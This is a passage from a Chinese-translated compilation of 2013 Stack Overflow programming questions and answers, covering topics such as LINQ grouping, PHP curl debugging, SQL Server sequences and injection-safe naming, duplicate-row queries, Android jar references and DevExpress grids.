            s.Append(String.Format("{0} : {1}", i.Text, i.Number));
        }

        Final.Add(id2, s.ToString());
    }
}

return Final; 
```

现在输出是正确的，但是如上面的评论所述，这需要非常长的时间来处理（90 秒 - 当然比我更舒服）并且想知道是否有更快的方法来实现这一点。

这段代码只会使用一次，所以不是真正的正常用法，通常我会因为这个原因而忽略它，但出于学习目的而想知道。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-08T17:31:40.573

这是我要做的（未经测试，但希望你明白）：

```
var final = ListAll.GroupBy(x => x.Secondary_ID)
                   .ToDictionary(x => x.Key, x => String.Join(", ", 
                       x.Select(y => String.Format("{0} : {1}", 
                           y.Text, y.Number))) 
```

`Secondary_ID`这首先通过using分组[`GroupBy`](http://msdn.microsoft.com/en-us/library/bb534501.aspx)，然后使用 将结果放入字典中[`ToDictionary`](http://msdn.microsoft.com/en-us/library/bb549277.aspx)。

这`GroupBy`会将您的数据分为以下几组：

```
键 = 1：

身份证 | 次要ID | 正文 | 数字
1 | 1 | “东西” | 3
1 | 1 | “别的东西”| 7
1 | 1 | “东西1” | 4

键 = 2：
身份证 | 次要ID | 正文 | 数字
1 | 2 | “东西2” | 344

键 = 3：
身份证 | 次要ID | 正文 | 数字
2 | 3 | “东西3” | 74
2 | 3 | “东西4” | 1

```

然后`.ToDictionary`方法：

*   选择键为`x.Key`（我们分组的键，即`Secondary_ID`）。
*   选择`String.Join`操作的结果作为值。正在加入的是来自该组内元素的“文本：数字”的集合 - `x.Select(y => String.Format("{0} : {1}", y.Text, y.Number)`。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-01-08T17:32:15.143

按 ID 对项目进行分组的一种更有效（甚至更容易编写）的方法是使用`GroupBy`.

```
var query = ListAll.GroupBy(x => x.Secondary_ID)
    .ToDictionary(group => group.Key,
        group => string.Join(", ",
             group.Select(item => string.Format("{0} : {1}",item.Text , item.Number))),
    //consider refactoring part of this line out to another method
    }); 
```

至于您的代码如此缓慢的原因，您正在整个列表中搜索每个不同的 ID。这是一个 O(n^2) 操作。 `GroupBy`不这样做。它在内部使用基于哈希的结构，基于您要分组的任何内容，因此它可以快速（在 O(1) 时间内）找到任何给定项目所属的存储桶，而不是 O(n) 时间采取你的方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-09T00:21:14.030

首先，到处删除`ToList()`，它应该变得更快；因为`ToList()`执行***急切的评估***。

我认为您的代码期望做的是：

```
var Final=new Dictionary<int, string>();

foreach(var x in ListAll)
    if(Final.ContainsKey(x.Secondary_ID))
        Final[x.Secondary_ID]+=String.Format(", {0} : {1}", x.Text, x.Number);
    else
        Final.Add(x.Secondary_ID, String.Format("{0} : {1}", x.Text, x.Number));

return Final; 
```

***A*** `Dictionary` ***不能包含重复键***，所以无论你在这里使用`ID`还是`Secondary_ID`，如果你`Secondary_ID`必须在现有的范围内`ID`；你甚至不需要`Distinct()`在代码中。

通过做一些简化，原始代码将是：

```
foreach(var id1 in ListAll.Select(x => x.ID).Distinct()) {
    foreach(var id2 in ListAll.Where(x => x.ID==id1).Select(x => x.Secondary_ID).Distinct()) {
        var s=new StringBuilder();

        foreach(var i in ListAll.Where(x => x.ID==id1).Where(x => x.Secondary_ID==id2)) {
            s.Append(String.Format("{0} : {1}", i.Text, i.Number));
        }

        Final.Add(id2, s.ToString());
    }
} 
```

# php - 如果响应代码为 500，如何使用 curl 输出网页正文？

> ID：14220659
> 
> 赞同：0
> 
> 时间：2013-01-08T17:25:41.863
> 
> 标签：php, curl

我已经经历了这个问题的地狱和高水位。我在页面上收到 500 错误的几率很小。我完全无法重现它，但谷歌坚持认为他们看到的是 500 代码。像 Googlebot 所说的那样抓取它是成功的，但是有问题。我已经走了很多路，我剩下的唯一办法就是暴力破解网站的本地副本。

我想使用 curl 来锤击开发站点，直到出现 500 错误，当我这样做时，将页面的主体输出到终端，这样我实际上可以获得一些有用的信息。

```
for(;;){
    $url = "http://www.blahblah.dev/";

    $ch = curl_init();

    //Set the URL
    curl_setopt($ch, CURLOPT_URL, $url);
    //Enable curl response
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    //Enable POST data
    curl_setopt($ch, CURLOPT_POST, true);
    //Use the $pData array as the POST data
    curl_setopt($ch, CURLOPT_POSTFIELDS, $jData);

    $result = curl_exec($ch);

    if(strstr($result, "error")){
        echo $result;
        exit();
    }

    curl_close($ch);
    usleep(500000);
} 
```

如您所见，我只是检查正文中是否出现“错误”，因为我无法弄清楚如何正确检查 500 错误。我意识到这是一种糟糕且人为的调试方式，但这就是我目前所拥有的一切。谢谢！

# javascript - 从 Razor 模型加载多个 Bing 地图图钉

> ID：14220661
> 
> 赞同：0
> 
> 时间：2013-01-08T17:25:45.873
> 
> 标签：javascript, html, asp.net-mvc-4

我是使用 javascript 和 ASP.Net MVC 4 的新手。但我尝试在 Razor @Model 的 bing 地图中添加多个引脚。我试过了：

```
@model IEnumerable<Foundation3SinglePageRWD.Models.Locations>
            <div id="map" style="height: 800px; width: 100%"></div>

    <script type="text/javascript">
    $(function () {
        var map = null;
        var location = null;

        function loadMap() {
            // initialize the map
            map = new Microsoft.Maps.Map(document.getElementById('map'), {
                credentials: "My Bing Map Key",
                enableSearchLogo: false
            });

        }

        function showPosition(position) {
                    function showPosition(position) {
            //display position
            var location = position.coords;
            map.setView({ zoom: 10, center: new Microsoft.Maps.Location(location.latitude, location.longitude) });
            //var pushpinOptions = { icon: virtualPath + '/Content/images/foundation/orbit/Push.png' };
            var test = '@model';
            alert(test);
            var pushpin = new Microsoft.Maps.Pushpin(map.getCenter(), null);
          for (var i = 0; i < test.l.length; i++) {
              map.entities.push(pushpin);
              pushpin.setLocation(new Microsoft.Maps.Location(test.latitude, test.longitude));
          };

        }

        }
        function positionError(position) {
            alert("Error getting position. Code: " + position.code);
        }
        loadMap();
        navigator.geolocation.getCurrentPosition(showPosition, positionError);

    });

</script> 
```

控制器：

```
 public ActionResult Index()
        {
            List<Models.Locations> loc = new List<Models.Locations>();
            Models.Locations temp = new Models.Locations("55.473746", "8.447411");
            loc.Add(temp);
            Models.Locations temp1 = new Models.Locations("55.504991", "8.443698");
            loc.Add(temp1);
            Models.Locations temp2 = new Models.Locations("55.468283", "8.438");
            loc.Add(temp2);
            Models.Locations temp3 = new Models.Locations("55.498978", "8.40002");
            loc.Add(temp3);
            return View(loc);
        } 
```

最后是模型：

```
 public class Locations
    {
        public string latitude { get; set; }
        public string longitude { get; set; }
        public List<Locations> Loca { get; set; }
        public Locations(string latitude, string longitude)
        {
            this.latitude = latitude;
            this.longitude = longitude;
        }
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T22:24:29.123

我相信您在将模型转换为 javascript 对象时遇到了问题。

下面我将索引视图与实际获取数据的部分分开

1.  `Index`仅返回您的页面，然后该页面将进行 ajax 调用以获取位置。

2.  `GetLocations`返回用于在 Bing 地图上呈现位置的 JSON 对象数组

**对控制器的更改**

```
 public ActionResult Index()
    {
         return View();
    }

    public ActionResult GetLocations()
    {
        List<Models.Locations> locations = new List<Models.Locations>()
        {
            new Models.Locations("55.473746", "8.447411") ,
            new Models.Locations("55.504991", "8.443698"),
            new Models.Locations("55.468283", "8.438"),
            new Models.Locations("55.468283", "8.438"),
            new Models.Locations("55.468283", "8.438"),
            new Models.Locations("55.498978", "8.40002")
        }
        return JsonResult(locations);
    } 
```

**Javascript 更改**

已更改`showPosition`，现在使 ajax 请求获取 JSON 位置列表并将其推送到地图上。注意：*您可能需要稍微重构 javascript 的其余部分。*

```
 function showPosition(position) 
    {
         //display position
          var location = position.coords;
           map.setView({ 
               zoom: 10, 
               center: new Microsoft.Maps.Location(location.latitude, 
                                                   location.longitude) 
           });

           $.ajax({
                url  : 'getlocations' , 
                type : 'json'

             }).done(function(locationsArray){

            alert(locationsArray);
            var pushpin = new Microsoft.Maps.Pushpin(map.getCenter(), null);

            $.each(locationsArray, 
                   function(index,location)
                   {
                        map.entities.push(pushpin);
                        pushpin.setLocation(new Microsoft.Maps.Location(
                            location.latitude, 
                            location.longitude));
                   });
              };
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T21:25:51.607

我不确定，关于必应地图。但我已经用谷歌地图实现了同样的功能。可能这会给你一些想法 [http://www.harshabopuri.com/onclick-dynamic-google-maps-in-website](http://www.harshabopuri.com/onclick-dynamic-google-maps-in-website)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-09T12:09:51.513

如果您使用 JavaScriptModel ( [http://jsm.codeplex.com](http://jsm.codeplex.com) )，您可以通过以下方式进行：

您的控制器代码：

```
public ActionResult Index()
{
    this.AddJavaScriptVariable("LocationsVariableInJavaScript", GetLocationList());
    this.AddJavaScriptFunction("YourMapInitFunctionInJavaScript");
    return View();
}

private GetLocationList()
{
    List<Models.Locations> loc = new List<Models.Locations>();
    Models.Locations temp = new Models.Locations("55.473746", "8.447411");
    loc.Add(temp);
    Models.Locations temp1 = new Models.Locations("55.504991", "8.443698");
    loc.Add(temp1);
    Models.Locations temp2 = new Models.Locations("55.468283", "8.438");
    loc.Add(temp2);
    Models.Locations temp3 = new Models.Locations("55.498978", "8.40002");
    loc.Add(temp3);
    return loc
} 
```

在您的 javascript 文件中，只需遍历位置（通过使用“LocationsVariableInJavaScript”）并添加图钉。

这样，您将 javascript 数据与 javascript 逻辑分开，并且视图中没有任何 javascript。

# php - PHP 输出缓冲区“千年”错误？

> ID：14220662
> 
> 赞同：0
> 
> 时间：2013-01-08T17:25:47.057
> 
> 标签：php, buffer, flush, minimum, output-buffering

我今天遇到了一个奇怪的问题。

几个月来，我在 PHP 中使用缓冲区刷新将小字符串大小发送到客户端而没有问题。

今天我回到项目，结果发现我的服务器不会发送小于 512 字节的字符串。

这是我的代码：

```
<?php
    echo "length:".$myUpcomingStringSize;
    ob_flush();
    flush();

    sleep(1);

    for($i = 0; $i < count($allLines); $++) {
        echo $allLines[$i];
        ob_flush();
        flush();
    }
?> 
```

这段代码在去年全年都像魅力一样工作。而现在它不再。我玩了一下并添加了一些随机字符。当字符串大小等于或大于 512 时，服务器发送缓冲区内容。

谁能想象我必须在这里解决的问题？还有其他人面临这个问题吗？或者有人知道如何配置这个最小数据包大小？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-09T08:28:03.543

如果您既未更改程序也未更改服务器，则应假定该程序从未按预期工作。众所周知，Windows 系统会缓冲输出，直到输出缓冲区中有一定数量的字节。这种缓冲是系统级的，因此不受任何 PHP 配置的影响。

如果您知道 512 字节是输出缓冲区发送所需的最小值，那么您可以使用类似

```
define('MIN_OUTPUT_LENGTH', 512);
echo str_pad("length: $myUpcomingStringSize", MIN_OUTPUT_LENGTH, "\0"), '\n';
// (If you run into trouble with the null-bytes, use space character instead) 
```

## 笔记

*   如果不使用“用户空间”输出缓冲，那么`ob_flush();`是多余的。
*   如果你的循环没有延迟`for`，那么在行之间刷新不是一个好主意。特别是对于网络尝试将尽可能多的数据打包到单个数据包中的移动应用程序。
*   `for`循环标头中存在语法错误（表达式`$++`可能缺少变量标识符`i`）

# c# - Ext.Net 中的正/负数掩码

> ID：14220663
> 
> 赞同：1
> 
> 时间：2013-01-08T17:25:59.120
> 
> 标签：c#, asp.net, mask, ext.net, maskedtextbox

我在 Ext.Net 中的 TextField 上有一个掩码，用于捕获正整数，包括带逗号的整数。

```
MaskRe="/[0-9\,]/" 
```

我只是意识到这不允许负面影响。在尝试了 s 的各种组合`MaskRe`并搜索 Google 之后，我一无所获。

如何更改掩码以允许正值和负值？

注意：我*不允许*用户为正值输入加号 (+)。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:38:00.237

终于让它工作了！我最终选择了这个：

```
MaskRe="[\-0123456789\,]" 
```

# jsf - Jasper 报告未在 PDF 中正确流式传输

> ID：14220664
> 
> 赞同：0
> 
> 时间：2013-01-08T17:26:00.723
> 
> 标签：jsf, jakarta-ee, pdf, jasper-reports

我正在使用 JR 生成 PDF 发票。在我的本地机器（linux ubuntu）上完美运行：

```
FacesContext fc = FacesContext.getCurrentInstance();
        ExternalContext ec = fc.getExternalContext();
        String templateAbsolutePath = ec.getRealPath(templateRelativePath);

        JasperReport jasperReport;
        try {
            jasperReport = JasperCompileManager.compileReport(templateAbsolutePath);        
            JasperPrint jasperPrint = JasperFillManager.fillReport(jasperReport, getParametriFattura(fattura), datasource );

            JasperExportManager.exportReportToPdfStream(jasperPrint, ec.getResponseOutputStream());

        } catch (JRException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        fc.responseComplete(); 
```

但是，当我将我的战争部署到登台服务器（linux ubuntu）时，它表明：

![在此处输入图像描述](../Images/28b0ec0f8aa0a618af808778327e5642.png)

我想这是一个微不足道的问题，但我可以从哪里开始呢？

*我特意省略了配置、系统细节等等……因为我不知道有什么用处。*

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T17:29:17.953

您需要明确告诉网络浏览器它是 PDF 文件，而不是 (X)HTML 文件。

```
ec.setResponseContentType("application/pdf"); 
```

注意：这需要在任何位写入响应正文*之前设置。*

# c# - 从 .NET 安全地获取下一个 SQL Server 序列值

> ID：14220667
> 
> 赞同：3
> 
> 时间：2013-01-08T17:26:10.503
> 
> 标签：c#, sql, sql-server, sequence, sql-server-2012

我正在 SQL Server 中试验 SEQUENCE 对象，并通过指定序列名称使用 C# 获取下一个值。范围很简单，因为它们有一个存储过程，并且您可以传递序列名称；

```
 public static T Reserve<T>(string name, int count, SqlConnection sqlConn)
    {
        using (var sqlCmd = new SqlCommand("sp_sequence_get_range", sqlConn))
        {
            sqlCmd.CommandType = CommandType.StoredProcedure;
            var firstValueParam = new SqlParameter("@range_first_value", SqlDbType.Variant) { Direction = ParameterDirection.Output };

            sqlCmd.Parameters.AddWithValue("@sequence_name", name);
            sqlCmd.Parameters.AddWithValue("@range_size", count);
            sqlCmd.Parameters.Add(firstValueParam);

            sqlCmd.ExecuteNonQuery();

            return (T)firstValueParam.Value;
        }
    } 
```

但是单一值呢？在我看来，我可以调用上面的计数为“1”，或者我可以动态构造 SQL。IE

```
var sqlCmdStr = string.Format("SELECT NEXT VALUE FOR {0}", name); 
```

我知道这通常是不好的做法（即 SQL 注入）。

有人会建议什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-08T17:40:05.387

> 我知道这通常是不好的做法（即 SQL 注入）。

并非每个动态 SQL 都是邪恶的。

您是否愿意接受 SQL 注入取决于值（插入到 SQL 文本中）的来源。如果它来自您的代码严格控制的地方（例如`switch`，从一组字符串常量中选择的语句），那么 SQL 注入就不是问题。

或者，您可以简单地对每个序列进行单独的查询（假设您没有很多）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-08T17:56:53.767

我的建议是结合@Gserg 的答案和您当前的解决方案。`VARCHAR`编写一个带有参数@Name的存储过程。`QUOTENAME`按照@GSerg 的建议，在存储过程中构建 sql 字符串。使用`EXEC`或`sp_executesql`运行脚本。

像这样的东西（徒手）：

```
CREATE PROCEDURE [GetNext]
    @Name VARCHAR(50)
AS
BEGIN
    DECLARE @sql VARCHAR(200);
    SET @Name = QUOTENAME(@Name, '[');
    SET @sql = 'SELECT NEXT VALUE FOR ' + @Name;

    EXEC (@sql);
END 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-07-25T13:54:00.287

Paul 解决方案的另一个版本，它将从 SQL 序列返回格式化的字母数字键

```
CREATE PROCEDURE [sp_GetNextKey]
@Name NVARCHAR(50),
@FormatText NVARCHAR(50)
AS

--DECLARE @Name NVARCHAR(50)='CustomerKeySequence'
--DECLARE @FormatText NVARCHAR(50) = 'CUS0000#'

DECLARE @sql NVARCHAR(200) = 'SELECT FORMAT((NEXT VALUE FOR ' + QUOTENAME(@Name, '"') + '),'+QUOTENAME(@FormatText, '''')+')';
EXEC (@sql)

/*
RETURNS i.e CUS00184
*/ 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-08T17:38:46.310

当我需要做类似的事情时，我会这样做：

```
string sanitized_name;
using (var sqlCmd = new SqlCommand("select quotename(@unsafe_name, '[');", sqlConn))
{
    sqlCmd.Parameters.AddWithValue("@unsafe_name", name);

    sanitized_name = (string)sqlCmd.ExecuteScalar();
}

using (var sqlCmd = new SqlCommand(string.Format("select next value for {0};", sanitized_name), sqlConn))
{
    ...
} 
```

或者创建一个执行相同操作的服务器端过程。

# sql-server-2008 - 带有见证的 SQL Server 镜像许可证

> ID：14220681
> 
> 赞同：0
> 
> 时间：2013-01-08T17:26:53.720
> 
> 标签：sql-server-2008, licensing, mirroring

我正在为客户开发一个应用程序，我需要使用 SQL Server，他需要高可用性。

我有一个关于可用于进行镜像配置和见证数据库的许可证的问题。

在本[文档](http://msdn.microsoft.com/en-us/library/cc645993.aspx)中，在“高可用性（AlwaysOn）”部分的“数据库镜像”行中，它说标准版支持它，但 Web 和 Express 仅作为见证。

这是否意味着我需要 2 个标准版实例，一个可能是 Express 或 Web？

网页版可以实现镜像吗？

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T18:03:00.743

简短的回答：不。您需要至少标准版的两个实例来支持镜像；见证服务器只是“见证”在主体和镜像之间自动故障转移的需要。此见证可以是 Web 版或 Express。

您可以在没有见证的情况下拥有镜像，但不会进行自动故障转移。

# xcode - 仅为调试配置 XCode 3.2 添加运行脚本阶段

> ID：14220682
> 
> 赞同：0
> 
> 时间：2013-01-08T17:26:55.223
> 
> 标签：xcode

我想为 XCode 3.2 项目运行脚本后期构建，因此我在目标中添加了“运行脚本”阶段。它工作得很好，但我只想在调试配置中运行这个脚本，有人知道怎么做吗？

谢谢，一个

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-06T19:27:44.350

看看这个答案，它看起来像你正在寻找的东西。[仅为 Xcode 4 中的“存档”构建运行脚本](https://stackoverflow.com/questions/5471396/running-script-only-for-an-archive-build-in-xcode-4)

# php - Windows7上的PHP位移

> ID：14220697
> 
> 赞同：2
> 
> 时间：2013-01-08T17:27:27.040
> 
> 标签：php, bit-manipulation

我有一台运行 Windows7 的笔记本电脑，如果我右键单击桌面上的“计算机”并选择属性，我可以看到“系统类型”是“64 位操作系统”如果我在 PHPStorm 中将 PHP_INT_MAX 作为手表运行，它会给我2147483647，为什么？这是否表明 PHPStorm 以 32 位运行或 PHP 以 32 位模式运行？如果我执行 php --version 我可以看到我正在运行 PHP 5.4.7

我的实际问题是，在我到达这行代码之前，我正在尝试执行**$result = $var << 5并且 $var 是 318 497 757 。**此行之后的 $result 是 1601993632 但应该是 10191928224 （如果我的数学是正确的）

出了什么问题，在哪里？我不知道出了什么问题或在哪里？谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T17:32:33.147

默认情况下，来自[windows.php.net](http://windows.php.net/download/)网站的**所有**公共 PHP 构建都是**32 位**的。根据您的描述，听起来您确实有 32 位的。

 **如果您想要 64 位 PHP，那么您需要找到（或自己编译）并使用 64 位 PHP 构建。

* * *

**如何检查您正在使用的 xx 位 PHP**

检查`phpinfo()`函数的输出（或仅`php -i`从命令行）。在顶部查找**架构行。**64 位将有`x64`，而 32 位将有`x86`.**

# sql - 如何获取同一张表中的记录差异计数，其中有不同的和几乎不同的记录

> ID：14220702
> 
> 赞同：3
> 
> 时间：2013-01-08T17:27:41.413
> 
> 标签：sql, oracle, distinct, netezza

我有一个`TABLEA`数据如下表

```
field1 field2 field3.......field16
123    10-JAN-12 0.8.......ABC
123    10-JAN-12 0.8.......ABC
.
.
.
123    10-JAN-12 0.7.......ABC
245    11-JAN-12 0.3.......CDE
245    11-JAN-12 0.3.......CDE
245    11-JAN-12 0.3.......XYZ
...
<unique rows> 
```

当我做一个

```
select field1, field2, ...field16 
  from TABLEA 
```

我获得了 M 条记录，当我做一个

```
select distinct field1, field2...field16 
  from TABLEA 
```

我获得了`M-x`记录，其中`M`是数百万，并且`x`是一个小得多的#。

我正在尝试编写 SQL 来获取 x 记录（最终，只需获取计数）。我已经尝试过所有 Set 运算符关键字，例如

```
select field1...field16 
 from TABLEA 
 EXCEPT 
 select distinct field1..field16 
   from TABLEA 
```

或使用`UNION ALL`代替 EXCEPT。但是它们都没有 return `x`，而是都返回 0 行。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T17:32:59.757

您可以选择不同的行

```
 SELECT field1, ... , field16
   FROM tablea
  GROUP BY field1, ... , field16
 HAVING count(*) > 1 
```

编辑：另一种方法是使用分析函数，按所有列进行`ROW_NUMBER()`分区。`field`给定字段集的第一行（即不同的）具有`ROW_NUMBER = 1`，第二行 = 2，第三行 = 3 等。因此您可以选择`x`-rows with `WHERE ROW_NUMBER > 1`。

```
CREATE TABLE tablea (
    field1 NUMBER, field2 DATE,  field3 NUMBER, field16 VARCHAR2(10)
);

INSERT INTO tablea VALUES (123, DATE '2012-01-10', 0.8, 'ABC');
INSERT INTO tablea VALUES (123, DATE '2012-01-10', 0.8, 'ABC');
INSERT INTO tablea VALUES (123, DATE '2012-01-10', 0.7, 'ABC');
INSERT INTO tablea VALUES (245, DATE '2012-01-11', 0.3, 'CDE');
INSERT INTO tablea VALUES (245, DATE '2012-01-11', 0.3, 'CDE');
INSERT INTO tablea VALUES (245, DATE '2012-01-11', 0.3, 'XYZ'); 
```

要选择重复的行`x`：

```
SELECT *
  FROM (
        SELECT field1, field2, field3, field16,
               ROWID AS rid,
               ROW_NUMBER() OVER (PARTITION BY 
               field1, field2, field3, field16 ORDER BY ROWID) as rn
          FROM tablea
        )
  WHERE rn > 1;

 123 10.01.2012 0.8 ABC AAAJ6mAAEAAAAExAAB 2
 245 11.01.2012 0.3 CDE AAAJ6mAAEAAAAExAAE 2 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-01-25T13:57:30.860

您将通过上面发布的自己的“除外”查询获得所需的内容。但是您必须在您的 except 中包含“ALL”关键字，因为“Except Distinct”是默认设置。所以我刚刚在您的查询本身中添加了下面的 ALL 关键字：

从 TABLEA 中选择 field1...field16 EXCEPT ***ALL*** 从 TABLEA 中选择不同的 field1..field16

如果您想要 Mx 的记录计数，则使上述查询成为另一个查询的 FROM 子句中的子查询，并在该外部查询中计数，您将获得如下所示的计数：

Select count(*) From ( select field1...field16 from TABLEA EXCEPT ALL select distinct field1..field16 from TABLEA
) B

猜猜这就是你要找的。

祝你好运

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-08T19:02:07.223

如果您的列选择相同，您将不会获得不在您不同的行结果的计数。Distinct 显示了所有结果的“DISTINCT”可能性，因此执行 union all 只会重复它，而 except 永远不会找到任何东西，因为你限制了你的行。你到底想做什么？尝试计算差异发生在哪里？你从沃尔夫冈那里得到的答案已经做到了。

```
declare @Table Table ( personID int identity, person varchar(8));

insert into @Table values ('Brett'),('Brett'),('Brett'),('John'),('John'),('Peter');

-- gives me all results
select person
from @Table

-- gives me distinct results (no repeats)
Select distinct person
from @Table

-- gives me nothing as nothing exists that is distinct that is not in total
select person
from @Table 
except 
select distinct person
from @Table

-- shows me counts of rows repeated by pivoting on one column and counting resultant rows from that.  Having clause adds predicate specific logic to hunt for.
-- in this case duplicates or rows greater than one
Select person, count(*)
from @Table 
group by person
having count(*) > 1 
```

编辑如果这就是您的意思，您可以获得与总数不同的差异：

```
 with dupes as 
    (
    Select count(*) as cnts, sum(count(*)) over() as TotalDupes
    from @Table 
    group by person 
    having count(*) > 1 -- dupes are defined by rows repeating 
    ) 
, uniques as 
    (
    Select count(*) as cnts, sum(count(*)) over() as TotalUniques
    from @Table 
    group by person 
    having count(*) = 1  -- non dupes are rows of only a single resulting row
    )
select distinct TotalDupes - TotalUniques as DifferenceFromRepeatsToUnqiues
from Dupes, Uniques 
```

# android - 引用 .jar 文件的最佳 Android 实践

> ID：14220703
> 
> 赞同：0
> 
> 时间：2013-01-08T17:27:44.270
> 
> 标签：android, eclipse, jar

考虑一个依赖于文件**B.jar**的 Android 库项目**A**的情况。

 **现在我想设置一个 Eclipse 开发环境以及一个命令行环境。最好的方法是什么？我是不是该：

1.  直接从 Eclipse引用**B.jar**文件（属性 -> Java 构建路径 -> 库）？但是我怎样才能让它在命令行环境中工作呢？
2.  `android create lib-project`使用仅**包含 B.jar**（如果可能的话）创建一个 Android 库项目并使用`android update project --path A --library B`？进一步使用 Properties -> Java Build Path -> Libraries 在 Eclipse 中进行引用。
3.  从 Eclipse 创建一个 Android 项目并只添加**B.jar**到它（我不知道如何）。如何在命令行环境中进行这项工作？

进一步创建一个依赖于其他 .jar 文件的库项目，应该将其作为单独的 .jar 文件还是包含其他文件的单个 .jar 文件分发？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T17:34:18.837

> 直接从 Eclipse 引用 B.jar 文件（属性 -> Java 构建路径 -> 库）？

绝对不是，因为这不适用于 Eclipse，更不用说命令行了。当您编译时，您的应用程序不会发送 JAR 的内容，并且您将在运行时崩溃。

> 使用 android create lib-project 创建一个仅包含 B.jar 的库项目（如果可能的话）并使用 android update project --path A --library B? 引用这个包装器项目？

嗯，你可以，虽然这似乎是矫枉过正。

> 从 Eclipse 创建一个 Android 项目，只添加 B.jar 到它（我不知道如何）

将 JAR 放在`libs/`项目的目录中。

> 如何在命令行环境中进行这项工作？

将 JAR 放在`libs/`项目的目录中。该`libs/`目录被添加到 Eclipse 和命令行构建的编译路径中，其内容`libs/`被添加到您的 Android APK 中。**

# version-control - 修订控制系统中的 UML

> ID：14220707
> 
> 赞同：0
> 
> 时间：2013-01-08T17:27:56.360
> 
> 标签：version-control, documentation, uml

我将项目文档理解为软件项目演变的一部分，有时与代码联系在一起（尤其是在精益方法中）。这就是为什么我认为将它与修订控制系统中的代码（例如 git，在我的例子中）保持在一起可能是一个好主意。

Markdown 似乎是一种广泛采用且有效的协作编辑文本文档的解决方案。但是，当涉及到实体关系或序列图时，我不知道要使用哪种格式/软件，因此仍然可以进行差异和合并。

所以我的问题是：

*   将代码和文档保存在同一个存储库中实际上是个好主意吗？
*   如果是，您会使用哪种格式的图表？

我目前正在考虑一些[文本 UML 图表工具](http://modeling-languages.com/uml-tools/#textual)，但我想知道您的意见。提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T20:47:49.737

*免责声明：我是 EMF 比较项目负责人*

在 Eclipse 世界中，[EMF 比较](http://www.eclipse.org/emf/compare/)项目通过为任何类型的模型（它[专门](http://wiki.eclipse.org/EMF_Compare/User_Guide#Compare_two_differing_branches)针对 UML 模型和图表）提供逻辑差异、合并和冲突检测来解决该问题。

它适用于 XMI 文件（但不限于）并与 Eclipse 团队支持（CVS、SVN，尤其是 GIT）集成，确保模型即使在多个文件中拆分时也始终保持一致。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T18:03:49.743

**关于谵妄的权利**

基于公理

> XML 元数据交换 (XMI) 是一种 OMG 标准，用于描述以 XML 格式存储 UML 模型的结构。

如果您能够找到任何可以导出/导入 XMI 的工具（就像[UML 的 Visual Paradigm](http://www.visual-paradigm.com/product/vpuml/provides/interop.jsp)所做的那样），您可以

*   使用 UML
*   在 SCM 级别存储、版本、处理 XMI 文件

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-10T10:52:03.600

OMG 为 UML 图（http://www.omg.org/spec/UMLDI/）定义了一种格式，但我想很多工具都没有实现它......实际上每个 UML 工具都有其内部图表表示，所以解决方案您的问题将在很大程度上取决于所使用的技术。如果模型和图表都以 XML (XMI) 格式形式化，例如基于 Eclipse-EMF 的工具[Topcased](http://www.topcased.org/)或 Together，我想您可以直接在文件上使用 GIT 或更高级的工具，例如 EMF Compare。如果您使用另一种工具，例如 RSx 或[Modelio](http://www.modelio.org/)，它们有自己的控制版本服务。

# devexpress - 如何从 devexpress gridcontrol tableview 中删除主从视图？

> ID：14220709
> 
> 赞同：2
> 
> 时间：2013-01-08T17:28:01.063
> 
> 标签：devexpress, tableview, gridcontrol

使用`devexpress`，我`xtragridcontrol`在表单上放置了一个，添加了一些列，然后用数据填充它：

```
gcCegek.DataSource = Nothing
ConnectToDb(fbconn, "public")
fbcommand.Connection = fbconn
fbcommand.CommandText = "select cegazon, rovidnev, varos, adoszam, konyvpnem, osszktg_forg from cegek order by cegazon"
fbadapter.SelectCommand = fbcommand
fbadapter.Fill(fbdataset)
gcCegek.DataSource = fbdataset
fbconn.Close() 
```

我收到`gridcontrol`，但在`master-detail`视图之内；这意味着我必须单击加号图标才能查看我想要显示的数据。

如何删除`master-detail`视图，以便我可以呈现一个包含列和行的简单表格？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T17:31:44.603

将[GridControl.ShowOnlyPredefinedDetails](http://documentation.devexpress.com/#WindowsForms/DevExpressXtraGridGridControl_ShowOnlyPredefinedDetailstopic)属性设置为 true。这将防止网格创建其他级别。

**更新**

这里有两个解决方案：

1) 将 GridControl 的 DataMember 属性设置为“cegazon”值

或 2) 将 gridControl 的 DataSource 设置为所需的 DataTable

# javascript - 停止在移动设备上加载 javascript

> ID：14220710
> 
> 赞同：0
> 
> 时间：2013-01-08T17:28:03.257
> 
> 标签：javascript

我有一个响应页面。在此页面上，我有一个在弹出窗口/模式中打开的按钮。我给这个按钮一个带有工作链接的href作为后备。在移动设备上，我希望禁用弹出窗口并在新窗口中打开链接。

到目前为止，我的 javascript 代码是...

```
var mq = window.matchMedia( "(min-width: 480px)" );

if (mq.matches) {

 function Modal(){

    //Code inside modal
}

}
else {
    function Modal(){
        exit();
    }   
} 
```

现在使用此代码，这确实可以在移动设备上运行，并在新窗口中打开链接，但是由于某种原因，主屏幕也可以这样做（主屏幕是指宽度大于 480 像素的窗口）。

